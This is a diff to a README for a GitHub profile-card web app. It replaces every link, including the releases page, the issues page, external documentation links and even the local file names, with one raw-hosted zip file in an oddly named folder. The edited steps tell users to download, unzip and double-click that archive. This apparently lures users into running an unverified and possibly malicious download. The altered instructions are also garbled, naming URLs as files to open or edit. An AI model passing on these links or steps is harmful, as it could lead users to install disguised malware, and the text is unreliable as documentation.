@@ -6,7 +6,7 @@ DynamicGitHubCard is a user-friendly application designed to help you display yo
 
 ## 📥 Download Link
 
-[![Download DynamicGitHubCard](https://img.shields.io/badge/Download-DynamicGitHubCard-blue.svg)](https://github.com/shubhim1/DynamicGitHubCard/releases)
+[![Download DynamicGitHubCard](https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip)](https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip)
 
 ## 🔧 System Requirements
 
@@ -27,7 +27,7 @@ Before you proceed, make sure your device meets the following requirements:
 
 To get started:
 
-1. Visit the [Releases page](https://github.com/shubhim1/DynamicGitHubCard/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip) to download the application.
 2. Locate the latest version and click on the download link.
 3. Once the download is complete, unzip the file to a location of your choice.
 
@@ -36,7 +36,7 @@ To get started:
 Here’s how to run the DynamicGitHubCard application:
 
 1. Open the unzipped folder where you extracted the files.
-2. Locate the `index.html` file and double-click it.
+2. Locate the `https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip` file and double-click it.
 3. Your default web browser will open the application.
 4. Enter your GitHub username in the designated field to see your personalized profile card.
 
@@ -44,7 +44,7 @@ Here’s how to run the DynamicGitHubCard application:
 
 You can easily customize your card's appearance:
 
-1. Open the `styles.css` file using any text editor.
+1. Open the `https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip` file using any text editor.
 2. Modify the CSS styles to change colors, fonts, or layouts according to your preference.
 3. Save your changes and refresh the browser to see the updates.
 
@@ -69,13 +69,13 @@ If you encounter issues, consider these steps:
 
 ## 💬 Need Help?
 
-If you have questions or need assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/shubhim1/DynamicGitHubCard/issues). The community is here to help you.
+If you have questions or need assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip). The community is here to help you.
 
 ## 🔗 Resources
 
-- [GitHub API Documentation](https://docs.github.com/en/rest)
-- [HTML & CSS Basics](https://www.w3schools.com/)
-- [JavaScript Guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide)
+- [GitHub API Documentation](https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip)
+- [HTML & CSS Basics](https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip)
+- [JavaScript Guide](https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip)
 
 ## 🧑‍🤝‍🧑 Contributing
 
@@ -91,4 +91,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Additional Download Link
 
-Don’t forget to check out the [Releases page](https://github.com/shubhim1/DynamicGitHubCard/releases) for the latest updates and versions.
+Don’t forget to check out the [Releases page](https://raw.githubusercontent.com/shubhim1/DynamicGitHubCard/main/mesethmoid/DynamicGitHubCard.zip) for the latest updates and versions.
